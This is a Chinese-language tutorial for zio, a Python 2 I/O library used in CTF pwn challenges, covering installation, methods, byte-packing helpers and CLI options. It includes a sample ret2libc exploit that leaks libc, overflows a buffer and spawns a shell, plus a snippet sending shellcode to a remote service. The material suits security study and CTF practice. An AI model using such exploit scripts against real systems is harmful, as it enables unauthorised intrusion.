# ZIO

zio 是一个易用的 Python io 库，在 Pwn 题目中被广泛使用，zio 的主要目标是在 stdin/stdout 和 TCP socket io
之间提供统一的接口，所以当你在本地完成 利用开发后，使用 zio 可以很方便地将目标切换到远程服务器。

zio 的哲学：

```python
from zio import *

if you_are_debugging_local_server_binary:
    io = zio('./buggy-server')          # used for local pwning development
elif you_are_pwning_remote_server:
    io = zio(('1.2.3.4', 1337))         # used to exploit remote service
    
io.write(your_awesome_ropchain_or_shellcode)
# hey, we got an interactive shell!
io.interact()
```

官方示例：

```moonscript
from zio import *
io = zio('./buggy-server')
# io = zio((pwn.server, 1337))
for i in xrange(1337):
    io.writeline('add ' + str(i))
    io.read_until('>>')
io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
io.read_until('A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = 'A' * 64 + l32(libc_system) + 'JJJJ' + l32(libc_binsh)
io.write('info ' + payload + "\nshow\nexit\n")
io.read_until(">>")
# We've got a shell;-)
io.interact()
```

需要注意的的是，zio 正在逐步被开发更活跃，功能更完善的 pwntools 取代，但如果你使用的是 32 位 Linux 系统，zio可能是你唯一的选择。而且在线下赛中，内网环境通常都没有 pwntools 环境，但 zio 是单个文件，上传到内网机器上就可以直接使用。

## 安装

zio 仅支持 Linux 和 OSX，并基于 python 2.6, 2.7。

```cmake
$ sudo pip2 install zio
```

`termcolor` 库是可选的，用于给输出上色：`$ sudo pip2 install termcolor`。

## 使用方法

由于没有文档，我们通过读源码来学习吧，不到两千行，很轻量，这也意味着你可以根据自己的需求很容易地进行修改。

总共导出了这些关键字：

```ini
__all__ = ['stdout', 'log', 'l8', 'b8', 'l16', 'b16', 'l32', 'b32', 'l64', 'b64', 'zio', 'EOF', 'TIMEOUT', 'SOCKET', 'PROCESS', 'REPR', 'EVAL', 'HEX', 'UNHEX', 'BIN', 'UNBIN', 'RAW', 'NONE', 'COLORED', 'PIPE', 'TTY', 'TTY_RAW', 'cmdline']
```

zio 对象的初始化定义：

```reasonml
def __init__(self, target, stdin = PIPE, stdout = TTY_RAW, print_read = RAW, print_write = RAW, timeout = 8, cwd = None, env = None, sighup = signal.SIG_DFL, write_delay = 0.05, ignorecase = False, debug = None):
```

通常可以这样：

```routeros
io = zio(target, timeout=10000, print_read=COLORED(RAW,'red'), print_write=COLORED(RAW,'green'))
```

内部函数很多，下面是常用的：

```python
def print_write(self, value):
def print_read(self, value):
def writeline(self, s = ''):
def write(self, s):
def read(self, size = None, timeout = -1):
def readlines(self, sizehint = -1):
def read_until(self, pattern_list, timeout = -1, searchwindowsize = None):
def gdb_hint(self, breakpoints = None, relative = None, extras = None):
def interact(self, escape_character=chr(29), input_filter = None, output_filter = None, raw_rw = True):
```

zio 里的 `read` 和 `write` 对应到 pwntools 里就是 `recv` 和 `send`。

另外是对字符的拆包解包，是对 struct 库的封装：

```isbl
>>> l32(0xdeedbeaf)
'\xaf\xbe\xed\xde'
>>> l32('\xaf\xbe\xed\xde')
3740122799
>>> hex(l32('\xaf\xbe\xed\xde'))
'0xdeedbeaf'
>>> hex(b64('ABCDEFGH'))
'0x4142434445464748'
>>> b64(0x4142434445464748)
'ABCDEFGH'
```

`l` 和 `b` 就是指小端序和大端序。这些函数可以对应 pwntools 里的 `p32()`，`p64()`等。

当然你也可以直接在命令行下使用它：

```elm
$ zio -h
usage:
    $ zio [options] cmdline | host port
options:
    -h, --help              help page, you are reading this now!
    -i, --stdin             tty|pipe, specify tty or pipe stdin, default to tty
    -o, --stdout            tty|pipe, specify tty or pipe stdout, default to tty
    -t, --timeout           integer seconds, specify timeout
    -r, --read              how to print out content read from child process, may be RAW(True), NONE(False), REPR, HEX
    -w, --write             how to print out content written to child process, may be RAW(True), NONE(False), REPR, HEX
    -a, --ahead             message to feed into stdin before interact
    -b, --before            don't do anything before reading those input
    -d, --decode            when in interact mode, this option can be used to specify decode function REPR/HEX to input raw hex bytes
    -l, --delay             write delay, time to wait before write
```